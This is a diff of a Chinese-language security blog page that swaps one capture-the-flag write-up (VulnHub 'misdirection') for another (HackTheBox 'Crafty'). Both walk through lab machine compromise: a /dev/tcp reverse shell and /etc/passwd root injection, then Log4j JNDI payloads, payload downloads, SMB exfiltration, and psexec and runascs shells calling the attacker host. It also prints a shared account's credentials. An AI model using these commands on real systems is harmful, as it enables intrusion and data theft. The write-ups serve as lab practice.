@@ -16,24 +16,24 @@
   <meta name="author" content="FYHypo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 端口扫描1、扫描C段主机发现12ip anmap -sn 192.168.203.0&#x2F;24   新出现的ip即为目标靶机注意：靶机要开nat模式   2、全端口以10000最低速率扫描1nmap --min-rate 100000 -p- 192.168.203.134   初步了解这台靶机：22端口ssh，80和8080开着web服务 (且大概率80是对外网页、8080是后台网页)，3">
+    <meta name="description" content="0x01 端口扫描  80web、25565mc    mc版本1.16.5  12echo &quot;10.129.19.226 crafty.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hoststail -n 1 &#x2F;etc&#x2F;hosts   0x02 web 12echo &quot;10.129.19.226 play.crafty.htb&quot; &gt;&gt; &#x2F;etc&#x2F;h">
 <meta property="og:type" content="article">
-<meta property="og:title" content="vulnhub misdirection">
-<meta property="og:url" content="https://fyhypo.github.io/blog/vulnhub/vulnhub%20misdirection/index.html">
+<meta property="og:title" content="HTB Crafty">
+<meta property="og:url" content="https://fyhypo.github.io/blog/HTB/HTB%20Crafty/index.html">
 <meta property="og:site_name" content="FYHypo&#39;s blog">
-<meta property="og:description" content="0x01 端口扫描1、扫描C段主机发现12ip anmap -sn 192.168.203.0&#x2F;24   新出现的ip即为目标靶机注意：靶机要开nat模式   2、全端口以10000最低速率扫描1nmap --min-rate 100000 -p- 192.168.203.134   初步了解这台靶机：22端口ssh，80和8080开着web服务 (且大概率80是对外网页、8080是后台网页)，3">
+<meta property="og:description" content="0x01 端口扫描  80web、25565mc    mc版本1.16.5  12echo &quot;10.129.19.226 crafty.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hoststail -n 1 &#x2F;etc&#x2F;hosts   0x02 web 12echo &quot;10.129.19.226 play.crafty.htb&quot; &gt;&gt; &#x2F;etc&#x2F;h">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://fyhypo.github.io/img/misdirection.jpg">
-<meta property="article:published_time" content="2024-08-31T14:11:34.594Z">
-<meta property="article:modified_time" content="2024-08-31T14:11:34.595Z">
+<meta property="og:image" content="https://fyhypo.github.io/img/Crafty.jpg">
+<meta property="article:published_time" content="2024-08-31T14:31:00.224Z">
+<meta property="article:modified_time" content="2024-08-31T14:31:00.225Z">
 <meta property="article:author" content="FYHypo">
 <meta property="article:tag" content="pentest">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fyhypo.github.io/img/misdirection.jpg">
+<meta name="twitter:image" content="https://fyhypo.github.io/img/Crafty.jpg">
   
   
   
-  <title>vulnhub misdirection - FYHypo&#39;s blog</title>
+  <title>HTB Crafty - FYHypo&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="vulnhub misdirection"></span>
+            <span id="subtitle" data-typed-text="HTB Crafty"></span>
           
         </div>
 
@@ -214,7 +214,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-08-31 22:11" pubdate>
+        <time datetime="2024-08-31 22:31" pubdate>
           2024年8月31日 晚上
         </time>
       </span>
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          736 字
+          666 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          7 分钟
+          6 分钟
         
       </span>
     
@@ -274,98 +274,228 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">vulnhub misdirection</h1>
+            <h1 id="seo-header">HTB Crafty</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><h4 id="1、扫描C段主机发现"><a href="#1、扫描C段主机发现" class="headerlink" title="1、扫描C段主机发现"></a>1、扫描C段主机发现</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ip a<br>nmap -sn 192.168.203.0/24<br></code></pre></td></tr></table></figure>
+                <p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814120522.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814115730.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>80web、25565mc</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814115808.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>mc版本1.16.5</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.19.226 crafty.htb&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814120227.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814180135.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;10.129.19.226 play.crafty.htb&quot;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<p>功能全是未开发，尝试目录爆破：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">feroxbuster -u http://10.129.19.226/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814180810.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>没有结果，转向mc服务</p>
+</blockquote>
+<h2 id="0x03-mc"><a href="#0x03-mc" class="headerlink" title="0x03 mc"></a>0x03 mc</h2><blockquote>
+<p>提到mc的rce，大概率就是log4j<br><a target="_blank" rel="noopener" href="https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847">https://software-sinner.medium.com/exploiting-minecraft-servers-log4j-ddac7de10847</a></p>
+</blockquote>
+<p>本质是远程加载恶意类反弹shell，脚本将启动一个LDAP服务器和一个HTTP服务器，通过在游戏聊天框输入类似<code>$&#123;jndi:ldap://localhost:1389/a&#125;</code>的payload通过jndi远程加载恶意类。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/kozmer/log4j-shell-poc">https://github.com/kozmer/log4j-shell-poc</a></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814181745.png" srcset="/img/loading.gif" lazyload></p>
+<p>按照文章的利用说明，我们还需要做三个准备：</p>
+<ol>
+<li>因为是windows机器，需要修改poc中的&#x2F;bin&#x2F;sh为cmd.exe</li>
+<li>在同级目录下下载jdk1.8并解压</li>
+<li>准备一个游戏启动器</li>
+</ol>
+<blockquote>
+<p>下载jdk时需要账号，可以在<a target="_blank" rel="noopener" href="https://bugmenot.com/view/oracle.com%E8%8E%B7%E5%BE%97%E5%85%AC%E5%BC%80%E8%B4%A6%E5%8F%B7">https://bugmenot.com/view/oracle.com获得公开账号</a><br><a href="mailto:&#101;&#114;&#102;&#101;&#100;&#x65;&#x40;&#121;&#111;&#112;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#101;&#114;&#102;&#101;&#100;&#x65;&#x40;&#121;&#111;&#112;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#99;&#111;&#109;</a><br>Bellapete!1</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814183057.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xf jdk-8u20-linux-x64.tar.gz<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 poc.py --userip 10.10.16.2 --webport 8000 --lport 9999<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814184154.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>pcl下载1.16.5启动后，聊天框输入<code>$&#123;jndi:ldap://10.10.16.2:1389/a&#125;</code>触发<br>若出现1.16.5无法添加多人游戏的bug，可参见<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv24474600/">【技术向】Minecraft1.16.5离线 多人游戏已禁用Bug 修复与分析 - 哔哩哔哩 (bilibili.com)</a></p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814190700.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x04-稳固立足点"><a href="#0x04-稳固立足点" class="headerlink" title="0x04 稳固立足点"></a>0x04 稳固立足点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell <span class="hljs-string">&quot;(New-Object System.Net.WebClient).Downloadfile(&#x27;http://10.10.16.2:8000/fyhypo.exe&#x27;,&#x27;fyhypo.exe&#x27;)&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> <span class="hljs-literal">-r</span> <span class="hljs-operator">-file</span> c:\users<br><span class="hljs-built_in">gc</span> C:\users\svc_minecraft\Desktop\user.txt<br></code></pre></td></tr></table></figure>
+
+<p>探索web目录：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ main.js <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>新出现的ip即为目标靶机<br>注意：靶机要开nat模式</p>
+<p>没有收获</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/5208d82dd1c04ee1ab5767ac8602fc86.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e3cfc8dd36ab4d5f9857473baed56761.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h4 id="2、全端口以10000最低速率扫描"><a href="#2、全端口以10000最低速率扫描" class="headerlink" title="2、全端口以10000最低速率扫描"></a>2、全端口以10000最低速率扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --min-rate 100000 -p- 192.168.203.134<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/bd663271a5a2426cb5c3a107ef2f098b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05 提权"></a>0x05 提权</h2><p><strong>枚举</strong></p>
 <blockquote>
-<p>初步了解这台靶机：22端口ssh，80和8080开着web服务 (且大概率80是对外网页、8080是后台网页)，3306连着mysql数据库</p>
+<p>sherlock没有结果、msf的都没有产生会话</p>
 </blockquote>
-<h4 id="3、初步tcp扫描探测详细信息"><a href="#3、初步tcp扫描探测详细信息" class="headerlink" title="3、初步tcp扫描探测详细信息"></a>3、初步tcp扫描探测详细信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p22,80,8080,3306 192.168.203.134<br></code></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814200028.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>换winpeas：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbserver.py share . -smb2support -username fyhypo -password fyhypo<br></code></pre></td></tr></table></figure>
 
-<p>初步分析没有必要udp扫描，直接在tcp扫描同时进行漏洞扫描：</p>
-<h4 id="4、漏洞脚本扫描"><a href="#4、漏洞脚本扫描" class="headerlink" title="4、漏洞脚本扫描"></a>4、漏洞脚本扫描</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script=vuln -p22,80,8080,3306 192.168.203.134<br></code></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>\share /user:fyhypo fyhypo<br><span class="hljs-built_in">copy</span> .\out.txt \\<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>\share\out.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2e57597dd4c04eddb31557cb013d92a2.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>apache，mysql，linux3.x<br>接着等待漏洞扫描结果</p>
-</blockquote>
-<p>等待有点久，决定先看看web网页：<br><img src="https://img-blog.csdnimg.cn/3fa2e7efd76c4086a0ce4f2ca38000e3.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>80端口是个voting(投票)页面，再看看8080：<br><img src="https://img-blog.csdnimg.cn/4691e3e537e0448da7d6771fdc127585.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>是个莫名其妙的介绍页面，先去看看漏洞扫描结果：</p>
-<p><img src="https://img-blog.csdnimg.cn/c2ec37a9d4b54889a5e96236640115e4.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>1、80的注册页面可能有sql注入<br>2、80可能有csrf（csrf优先级靠后，不急着试）<br>3、8080可以扫出很多东西，比如wordpress(开始考虑cms渗透)，还发现一个很感兴趣的debug</p>
-</blockquote>
-<h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><h4 id="先跑起对80的sqlmap和目录扫描"><a href="#先跑起对80的sqlmap和目录扫描" class="headerlink" title="先跑起对80的sqlmap和目录扫描"></a>先跑起对80的sqlmap和目录扫描</h4><p>先拿medium扫一下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.203.134/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/c29bffd2892a4326830ad4526ece068a.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>80不让扫，来都来了就先扫下8080，同时跑起sqlmap</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/64d75873222b4e0287b716b260f95c45.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>sqlmap没发现注入点，先放下这条路<br>对8080的扫描发现了两个令人感兴趣的东西：之前的debug和shell，访问一下看看：</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/d0838cc6c0e142459c09b4ca967d6c1c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>在debug页面发现直接给了shell，直接测试反弹shell</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.203.128/1234 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> out.txt | less -R --mouse<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/071cbe47d1e648d59cca7e167eef376e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
 <blockquote>
-<p>拿到初步立足点，低权限的www-data用户</p>
+<p>打了几十个补丁，且好几个exp因为权限不足运行失败，暂时可以放弃内核提权了</p>
 </blockquote>
-<h3 id="初步shell加固"><a href="#初步shell加固" class="headerlink" title="初步shell加固"></a>初步shell加固</h3><blockquote>
-<p>使shell可以使用清屏</p>
+<h3 id="administrator"><a href="#administrator" class="headerlink" title="administrator"></a>administrator</h3><blockquote>
+<p>由于是mc服务器，还有自己写的插件<code>playercounter-1.0-SNAPSHOT.jar</code>，玩家统计功能，大概率会和服务器进行认证后实时统计，所以对它逆向</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> TERM=xterm-color<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jd-gui playercounter-1.0-SNAPSHOT.jar<br></code></pre></td></tr></table></figure>
 
-<h2 id="0x03-初步提权到其他用户"><a href="#0x03-初步提权到其他用户" class="headerlink" title="0x03 初步提权到其他用户"></a>0x03 初步提权到其他用户</h2><p>先尝试sudo提权</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -l<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/00a456ad396d4bcbb1ce356c4caf994f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814212435.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814212417.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>发现brexit用户可以不使用密码起bash</p>
+<p>拿到密码s67u84zKq8IXw，由于交互性太低没法直接在靶机runas后输密码，所以使用psexec或runascs：</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo -u brexit /bin/bash<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/e088ec63c93149bb84e6258f56d30293.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>成功提权到了brexit用户<br><img src="https://img-blog.csdnimg.cn/6f1712edc7354201bd483b66a0adfd4f.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h3 id="再次加固shell"><a href="#再次加固shell" class="headerlink" title="再次加固shell"></a>再次加固shell</h3><blockquote>
-<p>获取完整shell：<br>1、 <code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>2、ctrl+z后台化shell<br>3、<code>stty raw -echo</code><br>4、输入<code>fg</code>+回车<br>此时shell就可以使用各种按键而不会乱码了，ctrl+c也不会断开<br><code>注意</code>：此过程需确保在监听端口前就使用着bash shell，而非默认的zsh shell</p>
+<p>1、psexec：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">psexec.exe -accepteula -u administrator -p s67u84zKq8IXw -d -i <span class="hljs-built_in">cmd</span>.exe /c &quot;<span class="hljs-keyword">for</span> /f %i <span class="hljs-keyword">in</span> (&#x27;whoami&#x27;) <span class="hljs-keyword">do</span> curl http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>:<span class="hljs-number">9999</span>/%i&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814232000.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">psexec.exe -accepteula -u administrator -p s67u84zKq8IXw -d -i <span class="hljs-built_in">cmd</span>.exe /c &quot;c:\ProgramData\app\fyhypo.exe&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814232300.png" srcset="/img/loading.gif" lazyload></p>
+<p>2、runascs：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">powershell &quot;iwr http://<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>:<span class="hljs-number">8000</span>/runascs.exe -outfile runascs.exe&quot;<br>.\runascs.exe administrator s67u84zKq8IXw powershell -r <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">16</span>.<span class="hljs-number">2</span>:<span class="hljs-number">8888</span> -t <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240814233907.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><blockquote>
+<p>现在已经拿到了administrator，那么只需要<code>psexec -s</code>就拿到了system的shell</p>
 </blockquote>
-<h3 id="再次提权到root"><a href="#再次提权到root" class="headerlink" title="再次提权到root"></a>再次提权到root</h3><blockquote>
-<p>因为不知道brexit的密码，所以sudo提权走不通</p>
-</blockquote>
-<p><code>养成习惯</code>：提权到其他用户后首先查看属于他的文件夹</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/brexit<br><span class="hljs-built_in">ls</span> -liah<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/6cfdae2dae324513baab1083dd69d116.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>发现可以查看shell的历史记录的隐藏文件，但注意到是0字节，所以只能放弃<br>接着看到了.viminfo有东西，查看：</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/d390d19211984669a27068cf9535a775.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>发现brexit可以通过vi对&#x2F;etc&#x2F;passwd修改<br>那么就简单了，直接在&#x2F;etc&#x2F;passwd插入一个自己的root用户即可提权</p>
-</blockquote>
-<h4 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h4><p>生成密码的哈希：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl passwd -1 123456  <span class="hljs-comment">#-1是指使用md5</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/833b80779e51410bb767fc2e264d8e1e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>查看下root用户的存储格式：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd | grep root<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/8ad23255d4fc415db4f6f535314012e9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<blockquote>
-<p>伪造一个root用户ys：<br>ys:$1$DYxaAHua$oJbruttN2RHg5PTWuJK3S0:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/a2023f0e966e4179b41a24b6260476b6.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>登录su用户：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su ys<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/5d694e0b8856424395c41f2096ae7563.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>成功root<br><img src="https://img-blog.csdnimg.cn/7bb77697c2ca48b29af4221f43a8502c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">psexec-x64.exe -s -accepteula -i cmd.exe /c <span class="hljs-string">&quot;c:\ProgramData\root.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">xcopy <span class="hljs-string">&quot;c:\Users\svc_minecraft\server&quot;</span> <span class="hljs-string">&quot;\\10.10.16.2\share&quot;</span> <span class="hljs-string">/E</span> <span class="hljs-string">/I</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
                 
               </div>
@@ -384,7 +514,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
   
   
 
@@ -411,8 +541,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>vulnhub misdirection</div>
-      <div>https://fyhypo.github.io/blog/vulnhub/vulnhub misdirection/</div>
+      <div>HTB Crafty</div>
+      <div>https://fyhypo.github.io/blog/HTB/HTB Crafty/</div>
     </div>
     <div class="license-meta">
       
@@ -456,18 +586,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blog/vulnhub/vulnhub%20Kiotrix3/" title="vulnhub Kiotrix3">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">vulnhub Kiotrix3</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blog/vulnhub/vulnhub%20pWnOS1.o/" title="vulnhub pWnOS1.0">
-                        <span class="hidden-mobile">vulnhub pWnOS1.0</span>
+                      <a href="/blog/HTB/HTB%20Bastard/" title="HTB Bastard">
+                        <span class="hidden-mobile">HTB Bastard</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
